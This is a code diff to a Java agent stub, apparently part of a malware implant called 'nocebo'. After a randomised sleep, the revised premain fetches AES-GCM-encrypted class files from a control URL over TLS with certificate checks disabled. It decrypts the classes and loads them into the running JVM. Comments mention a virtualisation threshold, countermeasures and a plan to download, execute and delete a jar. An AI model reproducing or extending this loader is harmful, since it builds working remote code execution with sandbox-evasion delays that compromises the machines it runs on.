@@ -92,11 +92,6 @@ import java.util.List;
 import java.awt.HeadlessException;
 import java.awt.Toolkit;
 
-//slated for wipe
-class nConfig
-{
-
-}
 
 public class Stub
 {
@@ -108,7 +103,9 @@ public class Stub
     static public boolean isAgent = true;
     static public String currentClass = "";
     static public int virtThreshold = 10; //5 for when it's ready
-    static private iAgent.security secInst = new iAgent.security();
+
+    //this is going to become much simpler, will download/execute/delete an ordinary jar
+
 
     //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nCore\*.java
     //cd src\main\java
@@ -124,40 +121,26 @@ public class Stub
         coreOp();
     }
 
-    public static void premain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
+    public static void premain(String agentArgs, Instrumentation inst) throws InstantiationException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
     {
         TimeUnit.MILLISECONDS.sleep((rngenerator(30,45))*1000);
         //sleep 30-45 (seconds for testing, minutes for release)
         //for attach execution
         coreOp();
 
-        Class currentClass = MethodHandles.lookup().lookupClass();
-        Class[] loadedClassSet = getLoadedClasses(inst);
-        for (int c=0;c<loadedClassSet.length;c++)
-        {
-            Class originalDef = (Class) loadedClassSet[c];
+        Hashtable<String,byte[]> classData = classRequest();
+        pkgLib cLoader = new pkgLib();
+        
+        Enumeration<String> b = classData.keys();
 
-            if (originalDef.getName().contains("nocebo"))
-            {
-                System.out.println(originalDef.getName());
-            }
-            if (originalDef.getName().contains(currentClass.getPackage().getName()))
-            {
-                System.out.println(originalDef.getName());
-                byte[] classBytes = classRequest(originalDef.getName());
-                //sorry leary
-                if (!(new String(classBytes)).equals("error.0x66696C65"))
-                {
-                    inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
-                }
-                else
-                {
-                    continue;
-                }
-            }
+        while (b.hasMoreElements())
+        {
+            String bData = b.nextElement();
+            cLoader.load(bData,classData.get(bData));
         }
-        System.out.println("init");
-        iAgent.init();
+        
+
+        //need to just make 
     }
 
     public static void agentmain(String agentArgs, Instrumentation inst) throws IOException, UnmodifiableClassException, KeyManagementException, URISyntaxException, ClassNotFoundException, NoSuchAlgorithmException, InterruptedException, SocketException
@@ -167,21 +150,14 @@ public class Stub
         //for attach execution
         coreOp();
 
-        Class currentClass = MethodHandles.lookup().lookupClass();
-        Class[] loadedClassSet = getLoadedClasses(inst);
-        for (int c=0;c<loadedClassSet.length;c++)
+        
+    }
+
+    private static class pkgLib extends ClassLoader {
+        private Class load(String className, byte[] classical)
         {
-            Class originalDef = (Class) loadedClassSet[c];
-            if (originalDef.getCanonicalName().contains(currentClass.getPackage().getName()))
-            {
-                byte[] classBytes = classRequest(originalDef.getName());
-                if (!classBytes.toString().equals("error.0x66696C65"))
-                {
-                    inst.redefineClasses(new ClassDefinition(originalDef, classBytes));
-                }
-            }
+            return defineClass(String.format("com.nocebo.nCore.%s",className), classical, 0, classical.length);
         }
-        iAgent.init();
     }
 
     public static void coreOp() throws IOException, UnmodifiableClassException, KeyManagementException, SocketException, ClassNotFoundException, URISyntaxException, NoSuchAlgorithmException
@@ -209,15 +185,6 @@ public class Stub
             System.exit(0);
         }
     }
-
-    //public static String getPackageName(String canonicalPath)
-    //{
-    //    System.out.println(canonicalPath);
-    //    String[] classCanonical = canonicalPath.split(".");
-    //    String[] packageNameElements = Arrays.copyOf(classCanonical, classCanonical.length-1);
-    //    
-    //    return String.join(".",packageNameElements);
-   // }
 
     public static void passThroughJar(String pathToJar, String[] initArgs)
     {
@@ -267,7 +234,7 @@ public class Stub
         catch (Exception e)
         {
             return false;
-        }
+        }   
         //System.out.println(envVarVal);
 
         if (envVarVal == null)
@@ -322,14 +289,13 @@ public class Stub
         return loadedClassSet;
     }
 
-    private static byte[] classRequest(String classicalName) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
+    private static Hashtable<String,byte[]> classRequest() throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
     {
         //stackoverflow provided boilerplate
         SSLContext sslCon = SSLContext.getInstance("TLS");
         sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);
-        String classNameEncoded = new String(Base64.getUrlEncoder().encode(classicalName.getBytes()));
 
-        URL ctrlUrl = new URI(String.format("%s?v=%s",urlData,classNameEncoded)).toURL();
+        URL ctrlUrl = new URI(urlData).toURL();
 
         HttpsURLConnection connMan;
         try
@@ -360,23 +326,42 @@ public class Stub
 
             if (connMan.getResponseCode() == HttpsURLConnection.HTTP_OK)
             {
+                //change this to process it to a arraylist
                 String nonceData = connMan.getHeaderField("uuid").substring(0,12).replace("-","");
                 BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                 String responseData = connInReader.readLine();
                 connInReader.close();
-
-                byte[] decodedResponseData = responseData.getBytes();
+                Hashtable<String,byte[]> decodedResponseData = new Hashtable();
                 if (!responseData.contains("error"))
-                { 
-                    decodedResponseData = secInst.decrypt(
-                        Base64.getDecoder().decode(
-                            responseData
-                        ),
-                        agentKey.getBytes(),
-                        nonceData.getBytes()
-                    );
-                }
+                {
+                    
+                    String[] rDataSet = responseData.split("\\|");
+                    
 
+                    for (int r=0;r<rDataSet.length;r++)
+                    {                
+
+                        String[] rData = rDataSet[r].split("\\.");
+                        String cNameData = new String(
+                            Base64.getDecoder().decode(
+                                rData[0].getBytes()
+                            )
+                        );
+                        
+
+                        decodedResponseData.put(
+                            cNameData,
+                            decrypt(
+                                    Base64.getDecoder().decode(
+                                        rData[1].getBytes()
+                                    ),
+                                    agentKey.getBytes(),
+                                    nonceData.getBytes()
+                                )        
+                            );     
+                        
+                    }
+                }
                 return decodedResponseData;
 
             }
@@ -385,14 +370,17 @@ public class Stub
                 BufferedReader connInReader = new BufferedReader(new InputStreamReader(connMan.getInputStream()));
                 String responseData = connInReader.readLine();
                 connInReader.close();
-                System.out.println(responseData);
-                return responseData.getBytes();
+                Hashtable<String,byte[]> hashedResponse =  new Hashtable();
+                hashedResponse.put("error",responseData.getBytes());
+                return hashedResponse;
             }
         }
         catch (Exception e)
         {
             e.printStackTrace();
-            return "null".getBytes();
+            Hashtable<String,byte[]> hashedResponse =  new Hashtable();
+            hashedResponse.put("error",e.getMessage().getBytes());
+            return hashedResponse;
         }
     }
 
@@ -484,122 +472,36 @@ public class Stub
         int randNum = rHandle.ints(1,min,max).findFirst().getAsInt();
         return randNum;
     }
-}
 
-class iAgent
-{
-    static private security secInst = new security();
-
-    public static void init()
+    public static byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
+        SecretKey key = initKey(keyData);
+        Cipher cipher = initCipher();
 
+        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
+        cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
+        return cipher.doFinal(plaintext);
     }
 
-    public static class runnableThread implements Runnable
+    public static byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
     {
-        public void run()
-        {
-        }
+        SecretKey key = initKey(keyData);
+        Cipher cipher = initCipher();
+
+        AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
+        cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
+        return cipher.doFinal(encrypted);
     }
 
-    private static class pkgLib extends ClassLoader 
+    private static Cipher initCipher() throws Exception
     {
-
+        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
+        return cipher;
     }
 
-    public static class utilitarian
+    private static SecretKey initKey(byte[] keyBytes) throws Exception
     {
-
-    }
-
-    public static class P2PServer
-    {
-
-    }
-
-    public interface P2PInterface extends Remote
-    {
-
-    }
-
-    public static class P2PSrvImpl extends UnicastRemoteObject implements P2PInterface
-    {
-        P2PSrvImpl() throws RemoteException
-        {
-            super();
-        }
-    }
-
-    public static class network
-    {
-        private String request(String postData, String endpointType) throws NoSuchAlgorithmException, KeyManagementException, IOException, URISyntaxException
-        {
-            HostnameVerifier allHostsValid = new HostnameVerifier() {
-                public boolean verify(String hostname, SSLSession session) {
-                return true;
-            }
-            };
-            return new String();
-        }
-
-
-        public class InvalidCertificateTrustManager implements X509TrustManager
-        {
-            @Override
-            public X509Certificate[] getAcceptedIssuers() {
-                return null;
-            }
-
-            @Override
-            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
-
-            }
-
-            @Override
-            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
-            }
-        }
-    }
-
-    private static class countermeasures 
-    {
-
-    }
-    
-
-    static class security
-    {
-        //replicates my lycanthropy aesgcm
-        public byte[] encrypt(byte[] plaintext, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
-        {
-            SecretKey key = initKey(keyData);
-            Cipher cipher = initCipher();
-
-            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
-            cipher.init(Cipher.ENCRYPT_MODE, key, ivParam);
-            return cipher.doFinal(plaintext);
-        }
-
-        public byte[] decrypt(byte[] encrypted, byte[] keyData, byte[] nonce) throws Exception, InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException
-        {
-            SecretKey key = initKey(keyData);
-            Cipher cipher = initCipher();
-
-            AlgorithmParameterSpec ivParam = new GCMParameterSpec(16*8,nonce);
-            cipher.init(Cipher.DECRYPT_MODE, key, ivParam);
-            return cipher.doFinal(encrypted);
-        }
-
-        private Cipher initCipher() throws Exception
-        {
-            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
-            return cipher;
-        }
-
-        private SecretKey initKey(byte[] keyBytes) throws Exception
-        {
-            SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
-            return key;
-        }
-    }
+        SecretKey key = new SecretKeySpec(keyBytes, 0, keyBytes.length, "AES");
+        return key;
+    }    
 }
